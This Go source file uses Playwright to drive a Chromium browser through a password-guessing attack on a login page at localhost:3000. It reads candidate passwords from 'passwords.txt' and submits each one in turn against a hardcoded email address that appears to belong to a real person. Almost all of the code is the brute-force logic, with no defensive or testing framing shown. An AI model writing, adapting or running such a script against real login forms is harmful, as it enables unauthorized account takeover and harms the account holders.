package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/playwright-community/playwright-go"
)

func assertErrorToNilf(message string, err error) {
	if err != nil {
		log.Fatalf(message, err)
	}
}

func ReadLinesFromFile(filename string) ([]string, error) {
	var lines []string

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}


func main(){
	filename := "passwords.txt" // Replace with the actual filename
	lines, err := ReadLinesFromFile(filename)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Println("Lines read from file:")
	for _, line := range lines {
		fmt.Println(line)
	}
	pw, err := playwright.Run()
	assertErrorToNilf("could not launch playwright: %w", err)

	browser, err := pw.Chromium.Launch(playwright.BrowserTypeLaunchOptions{
		Headless: playwright.Bool(false),
	})
	assertErrorToNilf("could not launch Chromium: %w", err)

	context, err := browser.NewContext()
	assertErrorToNilf("could not create context: %w", err)

	page, err := context.NewPage()
	assertErrorToNilf("could not create page: %w", err)

	_, err = page.Goto("http://localhost:3000/account/login")
	assertErrorToNilf("could not goto: %w", err)

	time.Sleep(1 * time.Second)

	page.Fill(`input[name="email"]`, "petcu_b@yahoo.ro")
	
	for i, line := range lines {
		time.Sleep(1 * time.Second)
		page.Fill(`input[name="password"]`, line)
		time.Sleep(1 * time.Second)
		page.Click(`button[class="formkit-input"]`)
		fmt.Println(i)
	}

	time.Sleep(1 * time.Second)

	time.Sleep(60 * time.Second)
	context.Close()
	browser.Close()
}